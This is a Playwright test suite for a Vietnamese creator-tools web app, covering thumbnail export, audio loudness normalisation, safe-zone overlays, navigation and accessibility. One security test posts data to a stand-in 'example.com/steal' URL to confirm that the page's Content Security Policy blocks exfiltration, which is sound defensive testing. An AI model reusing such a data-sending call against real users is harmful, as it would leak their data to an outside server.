// Creator tools (thumbnail, caption checker, audio extraction, loudness, safe zones), the new navigation and the
// security policy. Each test names the user-visible problem it prevents.
const { test, expect } = require('@playwright/test');
const { spawnSync } = require('node:child_process');
const { fx, probe, imageSize, hasFfprobe, openTab, grabDownload, renderAndDownload, codecs, NO_AAC, NO_EXPORT } = require('./helpers');

/** Integrated loudness (LUFS) of a media file, measured by ffmpeg's EBU R128 filter. */
function lufs(file) {
  const r = spawnSync('ffmpeg', ['-hide_banner', '-i', file, '-vn', '-af', 'ebur128', '-f', 'null', '-'], { encoding: 'utf8' });
  return +[...r.stderr.matchAll(/I:\s+(-?[0-9.]+) LUFS/g)].pop()[1];
}

/** Count CSP violations from the very first byte of the page. */
async function watchCsp(page) {
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
  });
}

test.describe('thumbnail maker', () => {
  test('YouTube thumbnail: 1920×1080 JPG under 2 MB (YouTube / Facebook reject or recompress huge files)', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe');
    await openTab(page, 'thumb');
    await page.fill('#thTitle', 'Kiếm *10 triệu* đầu tiên từ TikTok');
    await page.fill('#thBadge', 'MỚI');
    await page.click('#thExport');
    const dl = await grabDownload(page, () => page.locator('#thOut [data-a=dl]').click(), ti);
    expect(dl.name).toMatch(/1920x1080\.jpg$/);
    expect(imageSize(dl.path)).toEqual({ width: 1920, height: 1080 });
    expect(require('node:fs').statSync(dl.path).size).toBeLessThanOrEqual(2 * 1048576);
    await expect(page.locator('#thOut .card')).toContainText('vừa giới hạn');
  });

  test('a detailed 4K thumbnail still ends up under 2 MB: the JPG quality is lowered just enough', async ({ page }, ti) => {
    await openTab(page, 'thumb');
    await page.selectOption('#thSize', '3840x2160');
    // a "photo" full of fine detail (noise) is several MB at top quality
    await page.evaluate(async () => {
      const c = document.createElement('canvas'); c.width = 1920; c.height = 1080; // a phone photo, shown at 4K
      const x = c.getContext('2d'), d = x.createImageData(1920, 1080);
      let s = 7; for (let i = 0; i < d.data.length; i++) { s = (s * 1103515245 + 12345) >>> 0; d.data[i] = i % 4 === 3 ? 255 : s >>> 24; }
      x.putImageData(d, 0, 0);
      const dt = new DataTransfer();
      dt.items.add(new File([await new Promise((r) => c.toBlob(r, 'image/png'))], 'detail.png', { type: 'image/png' }));
      const inp = document.getElementById('thImg'); inp.files = dt.files; inp.dispatchEvent(new Event('change'));
    });
    await expect(page.locator('#thImgInfo')).toContainText('detail.png');
    await page.locator('#thDim').evaluate((e) => { e.value = 0; e.dispatchEvent(new Event('input', { bubbles: true })); });
    await page.click('#thExport');
    await expect(page.locator('#thOut .card')).toContainText('vừa giới hạn');
    const q = +(await page.locator('#thOut .card').textContent()).match(/chất lượng (\d+)%/)[1];
    expect(q, 'quality was lowered').toBeLessThan(95);
    expect(q, 'but not more than needed').toBeGreaterThanOrEqual(40);
    const dl = await grabDownload(page, () => page.locator('#thOut [data-a=dl]').click(), ti);
    expect(require('node:fs').statSync(dl.path).size).toBeLessThanOrEqual(2 * 1048576);
    if (hasFfprobe) expect(imageSize(dl.path)).toEqual({ width: 3840, height: 2160 });
    // the preview stays light: never drawn bigger than 1920 px wide
    expect(await page.evaluate(() => document.getElementById('thCanvas').width)).toBe(1920);
  });

  test('vertical cover (TikTok / Shorts) is 1080×1920 PNG', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe');
    await openTab(page, 'thumb');
    await page.selectOption('#thSize', '1080x1920');
    await page.selectOption('#thFormat', 'image/png');
    await page.click('#thExport');
    const dl = await grabDownload(page, () => page.locator('#thOut [data-a=dl]').click(), ti);
    expect(dl.name).toMatch(/\.png$/);
    expect(imageSize(dl.path)).toEqual({ width: 1080, height: 1920 });
  });

  test('*stars* paint the keyword in the accent colour (the main reason people use a thumbnail maker)', async ({ page }) => {
    await openTab(page, 'thumb');
    await page.locator('#thAccent').evaluate((e) => { e.value = '#00ff00'; e.dispatchEvent(new Event('input', { bubbles: true })); });
    const green = () => page.evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => {
      const c = document.getElementById('thCanvas'), d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
      let n = 0; for (let i = 0; i < d.length; i += 16) if (d[i + 1] > 200 && d[i] < 80 && d[i + 2] < 80) n++;
      r(n);
    }))));
    await page.fill('#thTitle', 'Học *tiếng Anh* mỗi ngày');
    expect(await green(), 'highlighted words are green').toBeGreaterThan(500);
    await page.fill('#thTitle', 'Học tiếng Anh mỗi ngày');
    expect(await green(), 'no stars → no green').toBeLessThan(50);
  });

  test('every style draws a different thumbnail, the chosen chip is announced', async ({ page }) => {
    await openTab(page, 'thumb');
    const sigs = new Set();
    for (const s of ['bold', 'news', 'clean', 'luxe', 'cute']) {
      await page.click(`#thStyles button[data-style=${s}]`);
      await expect(page.locator(`#thStyles button[data-style=${s}]`)).toHaveAttribute('aria-pressed', 'true');
      sigs.add(await page.evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(() => {
        const c = document.getElementById('thCanvas'), d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
        let h = 0; for (let i = 0; i < d.length; i += 4 * 97) h = (h * 31 + d[i] + 3 * d[i + 1] + 7 * d[i + 2]) >>> 0;
        r(h);
      })))));
    }
    expect(sigs.size).toBe(5);
  });

  test('a frame of a video can be the background (YouTubers pick the best moment)', async ({ page }) => {
    await openTab(page, 'thumb');
    const c = await codecs(page);
    test.skip(!c.h264, 'this browser build cannot play H.264 video (Playwright Linux WebKit)');
    await page.setInputFiles('#thImg', fx('clip.mp4'));
    await expect(page.locator('#thFrameWrap')).toBeVisible();
    await expect(page.locator('#thImgInfo')).toContainText('clip.mp4');
    await page.locator('#thFrame').evaluate((e) => { e.value = 500; e.dispatchEvent(new Event('input', { bubbles: true })); });
    await expect.poll(() => page.evaluate(() => {
      const cv = document.getElementById('thCanvas'), d = cv.getContext('2d').getImageData(0, 0, cv.width, cv.height).data;
      const seen = new Set(); for (let i = 0; i < d.length; i += 4 * 211) seen.add(d[i] >> 4 << 8 | d[i + 1] >> 4 << 4 | d[i + 2] >> 4);
      return seen.size;
    })).toBeGreaterThan(20);
  });

  test('caption checker: counts emoji as 1, flags a too-long YouTube title and hashtag spam', async ({ page }) => {
    await openTab(page, 'thumb');
    await page.fill('#thCaption', 'Mẹo học 😀 #hoctienganh #HocTiengAnh #tiktokvn');
    await expect(page.locator('#thCounts')).toContainText('Hashtag: 2');
    await expect(page.locator('#thCounts li.bad')).toHaveCount(0);
    await page.fill('#thCaption', 'x'.repeat(120) + ' ' + Array.from({ length: 20 }, (_, i) => '#tag' + i).join(' '));
    await expect(page.locator('#thCounts')).toContainText('Tiêu đề YouTube');
    await expect(page.locator('#thCounts li.bad').first()).toContainText('dài quá');
    await expect(page.locator('#thCounts')).toContainText('spam');
  });
});

test.describe('extract audio', () => {
  test('WAV of the chosen part, normalised to −14 LUFS (quiet voice notes were too soft on TikTok)', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe / ffmpeg');
    await openTab(page, 'extract');
    await expect(page.locator('#exRun')).toBeDisabled();
    await page.setInputFiles('#exFile', fx('tone.wav'));
    await expect(page.locator('#exInfo')).toContainText('0:03');
    await expect(page.locator('#exLoudInfo')).toContainText('tăng');
    await page.fill('#exStart', '0.5');
    await page.fill('#exDur', '2');
    await page.selectOption('#exFormat', 'wav');
    await page.click('#exRun');
    const dl = await grabDownload(page, () => page.locator('#exOut [data-a=dl]').click(), ti);
    expect(dl.name).toBe('tone.wav');
    const p = probe(dl.path);
    expect(p.audio.codec).toBe('pcm_s16le');
    expect(p.duration).toBeCloseTo(2, 1);
    const L = lufs(dl.path);
    expect(Math.abs(L + 14), `measured ${L} LUFS`).toBeLessThan(1);
  });

  test('"Giữ nguyên" keeps the original loudness', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe / ffmpeg');
    await openTab(page, 'extract');
    await page.setInputFiles('#exFile', fx('tone.wav'));
    await expect(page.locator('#exInfo')).toContainText('0:03');
    await page.selectOption('#exLoud', 'off');
    await page.selectOption('#exFormat', 'wav');
    await page.click('#exRun');
    const dl = await grabDownload(page, () => page.locator('#exOut [data-a=dl]').click(), ti);
    expect(Math.abs(lufs(dl.path) - lufs(fx('tone.wav')))).toBeLessThan(0.3);
  });

  test('M4A (AAC) from a video: plays on iPhone, smaller than WAV', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe');
    await openTab(page, 'extract');
    const c = await codecs(page);
    test.skip(!c.aac, NO_AAC);
    await page.setInputFiles('#exFile', fx('clip.mp4'));
    await expect(page.locator('#exInfo')).toContainText('clip.mp4');
    await page.click('#exRun');
    const dl = await grabDownload(page, () => page.locator('#exOut [data-a=dl]').click(), ti);
    expect(dl.name).toBe('clip.m4a');
    const p = probe(dl.path);
    expect(p.video).toBeNull();
    expect(p.audio.codec).toBe('aac');
    expect(p.audio.channels).toBe(2);
    expect(Math.abs(lufs(dl.path) + 14)).toBeLessThan(1.5);
  });

  test('a file that is not audio gives a clear message (no stuck "Đang đọc")', async ({ page }) => {
    await openTab(page, 'extract');
    await page.setInputFiles('#exFile', fx('notaudio.txt'));
    await expect(page.locator('#exInfo')).toContainText(/không phải|giải mã/);
    await expect(page.locator('#exRun')).toBeDisabled();
  });
});

test.describe('loudness in video export', () => {
  test('Audio → Video is exported at −14 LUFS by default, and as-is when turned off', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe / ffmpeg');
    await openTab(page, 'audiovideo');
    const c = await codecs(page);
    test.skip(!c.webcodecs && !c.recorder, NO_EXPORT);
    test.skip(!c.webcodecs, 'real-time recording path: loudness checked on the fast path');
    await page.setInputFiles('#avAudio', fx('tone.wav'));
    await expect(page.locator('#avAudioInfo')).toContainText('0:03');
    await page.selectOption('#avSize', '720x1280');
    await expect(page.locator('#avLoudInfo')).toContainText('−14');
    const a = await renderAndDownload(page, 'av', ti);
    expect(Math.abs(lufs(a.path) + 14), 'normalised').toBeLessThan(1);
    await page.selectOption('#avLoud', 'off');
    const b = await renderAndDownload(page, 'av', ti);
    expect(Math.abs(lufs(b.path) - lufs(fx('tone.wav'))), 'as the source').toBeLessThan(0.6);
  });
});

test.describe('safe-zone overlay', () => {
  test('TikTok overlay sits on the 9:16 preview, is never part of the picture, hides for 16:9', async ({ page }) => {
    await openTab(page, 'audiovideo');
    const sig = () => page.evaluate(() => { const c = document.getElementById('avCanvas'); return c.toDataURL().length + ':' + c.toDataURL().slice(-80); });
    const before = await sig();
    await page.click('#tab-audiovideo .sz-chips button[data-sz=tiktok]');
    const ov = page.locator('#tab-audiovideo .sz-overlay');
    await expect(ov).toBeVisible();
    await expect(page.locator('#tab-audiovideo .sz-chips button[data-sz=tiktok]')).toHaveAttribute('aria-pressed', 'true');
    const cv = await page.locator('#avCanvas').boundingBox(), o = await ov.boundingBox(), s = await page.locator('#tab-audiovideo .sz-safe').boundingBox();
    expect(o.x).toBeGreaterThanOrEqual(cv.x - 1);
    expect(o.x + o.width).toBeLessThanOrEqual(cv.x + cv.width + 1);
    expect(o.height / o.width).toBeCloseTo(16 / 9, 1);
    expect((o.y + o.height - (s.y + s.height)) / o.height, 'bottom 25 % covered by caption + username').toBeCloseTo(0.25, 1);
    expect((o.x + o.width - (s.x + s.width)) / o.width, 'right-side buttons').toBeCloseTo(0.14, 1);
    expect(await ov.evaluate((e) => getComputedStyle(e).pointerEvents)).toBe('none');
    expect(await sig(), 'the canvas itself is unchanged').toBe(before);
    // one choice for every tab
    await page.click('#tabs button[data-tab=imgvideo]');
    await expect(page.locator('#tab-imgvideo .sz-overlay')).toBeVisible();
    await page.selectOption('#ivSize', '1920x1080');
    await expect(page.locator('#tab-imgvideo .sz-overlay')).toBeHidden();
    const phone = page.viewportSize().width < 700;
    // wide screens explain why; phones hide the chips (they would cover the 16:9 picture in the small strip)
    if (phone) await expect(page.locator('#tab-imgvideo .sz-chips')).toBeHidden();
    else await expect(page.locator('#tab-imgvideo .sz-note')).toBeVisible();
    await page.selectOption('#ivSize', '1080x1920');
    await page.click('#tab-imgvideo .sz-chips button[data-sz=off]');
    await expect(page.locator('#tab-imgvideo .sz-overlay')).toBeHidden();
    await expect(page.locator('#tab-imgvideo .sz-note')).toBeHidden();
  });

  test('phone: the safe-zone chips do not make the sticky preview strip taller (settings stay visible)', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await openTab(page, 'audiovideo');
    const pv = await page.locator('#tab-audiovideo .preview').boundingBox(), cv = await page.locator('#avCanvas').boundingBox();
    expect(pv.height - cv.height, 'only the strip padding').toBeLessThan(24);
    const chips = await page.locator('#tab-audiovideo .sz-chips').boundingBox();
    expect(chips.y + chips.height).toBeLessThanOrEqual(cv.y + cv.height + 1);
    for (const b of await page.locator('#tab-audiovideo .sz-chips button').all()) expect((await b.boundingBox()).height).toBeGreaterThanOrEqual(43.5);
  });
});

test.describe('navigation and layout', () => {
  test('desktop: the tools are a sidebar next to the content, grouped by job', async ({ page }) => {
    await page.setViewportSize({ width: 1366, height: 860 });
    await openTab(page, 'thumb');
    const nav = await page.locator('#tabs').boundingBox(), main = await page.locator('#tab-thumb').boundingBox();
    expect(nav.x + nav.width).toBeLessThanOrEqual(main.x);
    expect(nav.height).toBeGreaterThan(300);
    await expect(page.locator('#tabs .tab-group')).toHaveText(['Làm video', 'Đăng bài', 'Ảnh']);
    // switching tools from the sidebar keeps the new tool's heading on screen
    await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
    await page.click('#tabs button[data-tab=extract]');
    const h = await page.locator('#tab-extract h2').boundingBox();
    expect(h.y).toBeGreaterThanOrEqual(0);
    expect(h.y).toBeLessThan(400);
  });

  test('phone: "Xuất video" stays within thumb reach while scrolling the settings', async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await openTab(page, 'audiovideo');
    await page.locator('#avPalettes').scrollIntoViewIfNeeded();
    const b = await page.locator('#avRender').boundingBox();
    expect(b.y + b.height).toBeLessThanOrEqual(844);
    expect(b.y).toBeGreaterThan(844 * 0.75);
    expect(b.height).toBeGreaterThanOrEqual(44);
  });

  test('the app opens on the video tools (what creators come for)', async ({ page }) => {
    await openTab(page);
    await expect(page.locator('#tab-audiovideo')).toBeVisible();
    await expect(page.locator('#tabs button[data-tab=audiovideo]')).toHaveAttribute('aria-selected', 'true');
  });
});

test.describe('security', () => {
  test('no CSP violation while loading, using every tool and exporting (the policy must not break features)', async ({ page }) => {
    await watchCsp(page);
    await openTab(page, 'audiovideo');
    for (const t of ['imgvideo', 'textvideo', 'thumb', 'extract', 'convert', 'compress', 'edit', 'audiovideo']) await page.click(`#tabs button[data-tab=${t}]`);
    await page.evaluate(() => VideoEngine.loadMediabunny());
    await page.click('#tabs button[data-tab=thumb]');
    await page.click('#thExport');
    await expect(page.locator('#thOut .card')).toBeVisible();
    expect(await page.evaluate(() => window.__csp)).toEqual([]);
  });

  test('the page cannot send data to another server (CSP blocks it)', async ({ page }) => {
    await watchCsp(page);
    await openTab(page);
    const r = await page.evaluate(async () => {
      try { await fetch('https://example.com/steal', { method: 'POST', body: 'x' }); return 'sent'; } catch (e) { return 'blocked'; }
    });
    expect(r).toBe('blocked');
    await expect.poll(() => page.evaluate(() => window.__csp.join(' '))).toContain('connect-src');
  });

  test('a huge file is refused with a message instead of crashing the phone tab', async ({ page }) => {
    await openTab(page, 'convert');
    const shown = await page.evaluate(() => {
      const f = new File(['x'], 'huge.jpg', { type: 'image/jpeg' });
      Object.defineProperty(f, 'size', { value: 400 * 1048576 });
      const dt = new DataTransfer();
      dt.items.add(f);
      const ev = new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true });
      Object.defineProperty(ev, 'dataTransfer', { value: { files: [f] } });
      document.querySelector('.drop[data-input=convFiles]').dispatchEvent(ev);
      return document.getElementById('toast').textContent;
    });
    expect(shown).toMatch(/quá lớn/);
    await expect(page.locator('#convResults .card')).toHaveCount(0);
  });
});

/* ---------------- gaps found by the review ---------------- */
const Core = require('../../js/core.js');
/** A WAV built in Node: channels = array of Float32Array. */
const wavFile = (name, channels, sr = 48000) => ({ name, mimeType: 'audio/wav', buffer: Buffer.from(Core.encodeWav(channels, sr)) });
const tone = (sec, amp, f = 440, sr = 48000) => { const x = new Float32Array(sec * sr); for (let i = 0; i < x.length; i++) x[i] = amp * Math.sin((2 * Math.PI * f * i) / sr); return x; };
function peakDb(file) {
  const r = spawnSync('ffmpeg', ['-hide_banner', '-i', file, '-af', 'volumedetect', '-f', 'null', '-'], { encoding: 'utf8' });
  return +r.stderr.match(/max_volume: (-?[0-9.]+) dB/)[1];
}

test.describe('review fixes', () => {
  test('a mono recording saved as mono WAV really reaches −14 LUFS (it was 3 dB short)', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe / ffmpeg');
    await openTab(page, 'extract');
    await page.setInputFiles('#exFile', wavFile('giong-noi.wav', [tone(4, 0.05)]));
    await expect(page.locator('#exInfo')).toContainText('1 kênh');
    await page.selectOption('#exFormat', 'wav');
    await expect(page.locator('#exLoudInfo')).toContainText('đạt −14');
    await page.click('#exRun');
    const dl = await grabDownload(page, () => page.locator('#exOut [data-a=dl]').click(), ti);
    expect(probe(dl.path).audio.channels).toBe(1);
    const L = lufs(dl.path);
    expect(Math.abs(L + 14), `measured ${L}`).toBeLessThan(0.5);
  });

  test('5.1 audio: the voice on the centre channel is kept and nothing clips', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe / ffmpeg');
    await openTab(page, 'extract');
    const z = () => tone(4, 0.002, 90);
    await page.setInputFiles('#exFile', wavFile('phim-5.1.wav', [z(), z(), tone(4, 0.3), z(), z(), z()]));
    const info = await page.locator('#exInfo').textContent({ timeout: 15000 }).catch(() => '');
    await expect(page.locator('#exInfo')).not.toHaveText(/Đang đọc/);
    test.skip(!/6 kênh/.test(await page.locator('#exInfo').textContent()), 'this browser down-mixes 5.1 while decoding: ' + info);
    await page.selectOption('#exFormat', 'wav');
    await page.click('#exRun');
    const dl = await grabDownload(page, () => page.locator('#exOut [data-a=dl]').click(), ti);
    expect(probe(dl.path).audio.channels).toBe(2);
    expect(Math.abs(lufs(dl.path) + 14), 'normalised with the voice in it').toBeLessThan(1);
    expect(peakDb(dl.path), 'no clipping').toBeLessThanOrEqual(-1);
  });

  test('Text + Audio → Video is also exported at −14 LUFS', async ({ page }, ti) => {
    test.skip(!hasFfprobe, 'needs ffprobe / ffmpeg');
    await openTab(page, 'textvideo');
    const c = await codecs(page);
    test.skip(!c.webcodecs, NO_EXPORT);
    await page.setInputFiles('#tvAudio', fx('tone.wav'));
    await expect(page.locator('#tvLoudInfo')).toContainText('−14');
    await page.selectOption('#tvSizeSel', '720x1280');
    const dl = await renderAndDownload(page, 'tv', ti);
    expect(Math.abs(lufs(dl.path) + 14)).toBeLessThan(1);
  });

  test('"Xem thử" plays at the same loudness as the export (a gain node with the export gain)', async ({ page }) => {
    await openTab(page, 'audiovideo');
    await page.evaluate(() => {
      window.__gains = [];
      const orig = AudioContext.prototype.createGain;
      AudioContext.prototype.createGain = function () { const g = orig.call(this); window.__gains.push(g); return g; };
    });
    await page.setInputFiles('#avAudio', fx('tone.wav'));
    await expect(page.locator('#avLoudInfo')).toContainText('tăng');
    await page.click('#avPlay');
    await expect(page.locator('#avPlay')).toContainText('Dừng');
    const used = await page.evaluate(() => window.__gains.map((g) => g.gain.value));
    expect(used.some((v) => v > 2), `gain nodes: ${used}`).toBe(true); // tone.wav is −22.8 LUFS → about ×2.8
    await page.click('#avPlay');
  });

  test('9:16 cover: no title text under the TikTok / Reels / Shorts buttons or caption', async ({ page }) => {
    await openTab(page, 'thumb');
    await page.selectOption('#thSize', '1080x1920');
    await page.locator('#thBg').evaluate((e) => { e.value = '#000000'; e.dispatchEvent(new Event('input', { bubbles: true })); });
    await page.locator('#thDim').evaluate((e) => { e.value = 0; e.dispatchEvent(new Event('input', { bubbles: true })); });
    await page.fill('#thSub', 'Dòng phụ khá dài để thử xem có tràn ra ngoài vùng an toàn hay không');
    for (const pos of ['bottom', 'top', 'middle']) {
      await page.selectOption('#thPos', pos);
      await page.fill('#thTitle', 'Một tiêu đề rất dài nhiều chữ để chữ phải xuống nhiều dòng liền');
      const r = await page.evaluate(async () => {
        const { blob } = await Thumb.exportBlob();
        const bmp = await createImageBitmap(blob);
        const c = document.createElement('canvas'); c.width = bmp.width; c.height = bmp.height;
        const x = c.getContext('2d'); x.drawImage(bmp, 0, 0);
        const d = x.getImageData(0, 0, c.width, c.height).data;
        const z = ['tiktok', 'reels', 'shorts'].map((p) => Core.safeRect(p, c.width, c.height));
        const sx = Math.max(...z.map((a) => a.x)), sy = Math.max(...z.map((a) => a.y));
        const ex = Math.min(...z.map((a) => a.x + a.w)), ey = Math.min(...z.map((a) => a.y + a.h));
        let inside = 0, outside = 0;
        for (let y = 0; y < c.height; y += 3) for (let xx = 0; xx < c.width; xx += 3) {
          const i = (y * c.width + xx) * 4;
          if (d[i] > 200 && d[i + 1] > 200 && d[i + 2] > 200) { if (xx >= sx - 4 && xx <= ex + 4 && y >= sy - 4 && y <= ey + 4) inside++; else outside++; }
        }
        return { inside, outside };
      });
      expect(r.inside, `${pos}: text drawn`).toBeGreaterThan(500);
      expect(r.outside, `${pos}: white text pixels in the covered area`).toBe(0);
    }
  });

  test('white text on the pink buttons, active tab and skip link has contrast ≥ 4.5:1 (project rule)', async ({ page }) => {
    await openTab(page, 'audiovideo');
    await page.focus('.skip');
    const pairs = await page.evaluate(() => {
      const hex = (c) => '#' + c.match(/\d+/g).slice(0, 3).map((n) => (+n).toString(16).padStart(2, '0')).join('');
      return [...document.querySelectorAll('button.primary, #tabs button.active, .skip')]
        .filter((e) => e.offsetParent || e === document.activeElement)
        .map((e) => { const s = getComputedStyle(e); return [e.textContent.trim().slice(0, 20), Core.contrast(hex(s.color), hex(s.backgroundColor))]; });
    });
    expect(pairs.length).toBeGreaterThan(1);
    for (const [name, ratio] of pairs) expect(ratio, name).toBeGreaterThanOrEqual(4.5);
  });

  test('a huge PHOTO chosen as thumbnail background gets the 150 MB photo limit (not the video limit)', async ({ page }) => {
    await openTab(page, 'thumb');
    const shown = await page.evaluate(() => {
      const f = new File(['x'], 'anh-to.jpg', { type: 'image/jpeg' });
      Object.defineProperty(f, 'size', { value: 300 * 1048576 });
      const ev = new DragEvent('drop', { bubbles: true, cancelable: true });
      Object.defineProperty(ev, 'dataTransfer', { value: { files: [f] } });
      document.querySelector('.drop[data-input=thImg]').dispatchEvent(ev);
      return document.getElementById('toast').textContent;
    });
    expect(shown).toMatch(/quá lớn .* cho ảnh/);
  });

  test('keyboard: "Bỏ qua menu" jumps to the tool; ↑ ↓ move through the desktop sidebar', async ({ page }) => {
    await page.setViewportSize({ width: 1366, height: 860 });
    await openTab(page, 'audiovideo');
    await page.focus('.skip');
    await page.keyboard.press('Enter');
    expect(await page.evaluate(() => document.activeElement.id)).toBe('main');
    expect(page.url()).toMatch(/#audiovideo$/);
    await expect(page.locator('#tabs')).toHaveAttribute('aria-orientation', 'vertical');
    await page.focus('#tabs button[data-tab=audiovideo]');
    await page.keyboard.press('ArrowDown');
    await expect(page.locator('#tabs button[data-tab=imgvideo]')).toHaveAttribute('aria-selected', 'true');
    await page.keyboard.press('End');
    await expect(page.locator('#tabs button[data-tab=edit]')).toHaveAttribute('aria-selected', 'true');
    await expect(page.locator('#tab-edit')).toHaveAttribute('aria-labelledby', 'tabbtn-edit');
  });
});
